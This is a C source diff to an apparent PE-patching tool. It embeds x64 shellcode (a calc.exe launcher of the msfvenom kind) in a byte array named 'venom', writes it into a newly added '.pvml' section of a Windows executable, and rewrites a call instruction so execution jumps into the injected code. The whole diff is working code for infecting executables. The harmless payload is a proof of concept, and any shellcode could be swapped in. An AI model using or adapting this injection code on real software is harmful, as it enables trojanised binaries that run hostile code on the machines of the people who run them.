@@ -376,6 +376,29 @@ int test_new_section() {
 }
 
 int main() {
+unsigned char venom[] = 
+"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
+"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
+    unsigned int VENOM_SIZE = sizeof(venom) / sizeof(unsigned char);
+
     ExeInfo* exe_info;
     AsmParserState* asm_state;
     JumpTable* jump_table;
@@ -399,6 +422,7 @@ int main() {
     find_all_calls_to(asm_state, jump_table, "fputs");
     find_all_calls_to(asm_state, jump_table, "fwrite");
     find_all_calls_to(asm_state, jump_table, "exit");
+    
 
     FILE* fd = fopen(EXECUTABLE_FILENAME, "r");   
 
@@ -406,11 +430,11 @@ int main() {
     read_file(fd, exe_info->file_size, &data);
     ModTable* mod_table = build_mod_table(data, exe_info->file_size, 8, 8, 8);
 
-    if (can_push_back_new_section(exe_info, fd)) {
+    if (!can_push_back_new_section(exe_info, fd)) {
         printf("WARNING: Cannot safely push back new section, information might be overwritten\n");
     }
 
-    char* payload_buffer = malloc(NEW_SECTION_RAW_DATA_SIZE);
+    char* payload_buffer = calloc(1, NEW_SECTION_RAW_DATA_SIZE);
     SectionBuildInfo new_section = {
         .name = ".pvml",
         .data = payload_buffer,
@@ -423,7 +447,12 @@ int main() {
     unsigned int processor_count = 1;
     unsigned int* processor_entry_points = malloc(sizeof(unsigned int) * processor_count);
 
-    
+    // put venom in payload
+    {
+        memcpy(payload_buffer, venom, VENOM_SIZE);
+    }
+
+    /*
     // build payload
     {
         const char* processor_source_files[] = {
@@ -433,16 +462,14 @@ int main() {
         unsigned int processors_size = build_processors(payload_buffer, PROCESSORS_BEGIN_PTR, 
                 new_header, NULL, processor_source_files, processor_count, &processor_entry_points);
     }
+    */
 
     // change call to jump instruction
     {
         unsigned int ptr = asm_state->binary_instruction_pointers[1740];
-        
-        printf("PROCESSOR ENTRY POINT: 0x%" PRIx32 "\n", processor_entry_points[0]);
-
+        //unsigned int ptr = exe_info->nt_header->OptionalHeader.AddressOfEntryPoint;
         InstructionInfo* jmp_info = build_jump_near(exe_info->text_section, ptr,
-                new_header->VirtualAddress + processor_entry_points[0]);
-        print_hex(jmp_info->raw_data, jmp_info->data_length);
+                new_header->VirtualAddress);
         add_instruction(mod_table, jmp_info);
     }
 
